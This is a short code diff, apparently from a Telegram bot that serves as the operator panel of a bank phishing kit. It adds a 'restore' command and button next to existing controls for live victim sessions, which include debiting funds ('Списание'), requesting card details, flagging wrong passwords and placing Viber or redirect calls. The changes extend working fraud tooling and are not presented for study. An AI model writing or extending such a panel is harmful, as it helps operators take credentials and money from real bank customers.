@@ -162,6 +162,10 @@ bot.on('callback_query', (callbackQuery) => {
             command.type = 'redirect_call';
             responseText = 'Запрос Переадресация 📞 отправлен!';
             break;
+        case 'restore':
+            command.type = 'restore';
+            responseText = 'Запрос "Восстановить" отправлен!';
+            break;
         default:
             console.error(`Неизвестная команда: ${type}`);
             bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}`, show_alert: true });
@@ -337,6 +341,7 @@ function sendToTelegram(message, sessionId, bankName) {
                 { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
                 { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
                 { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` },
+                { text: 'Восстановить', callback_data: `restore:${sessionId}` },
             ],
             [
                 { text: 'Пароль ❌', callback_data: `password_error:${sessionId}` },
@@ -354,6 +359,7 @@ function sendToTelegram(message, sessionId, bankName) {
                 { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
                 { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
                 { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` },
+                { text: 'Восстановить', callback_data: `restore:${sessionId}` },
             ],
             [
                 { text: 'Пароль ❌', callback_data: `password_error:${sessionId}` },
@@ -370,6 +376,7 @@ function sendToTelegram(message, sessionId, bankName) {
                 { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
                 { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
                 { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` },
+                { text: 'Восстановить', callback_data: `restore:${sessionId}` },
             ],
             [
                 { text: 'Пароль ❌', callback_data: `password_error:${sessionId}` },
